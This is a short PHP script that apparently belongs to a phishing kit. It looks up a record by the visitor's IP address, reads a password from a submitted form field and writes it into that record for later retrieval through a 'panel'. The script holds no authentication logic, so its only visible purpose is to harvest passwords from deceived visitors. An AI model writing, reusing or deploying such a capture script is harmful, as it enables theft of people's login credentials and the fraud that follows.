<?php
require('../panel/lib/funciones.php');
date_default_timezone_set('America/Bogota');

$ip = $_SERVER['REMOTE_ADDR'];
$registro = traer_regitro($ip);

$contrasena = $_POST['pass'];

actualizar_registro_pass($registro,$contrasena);
?>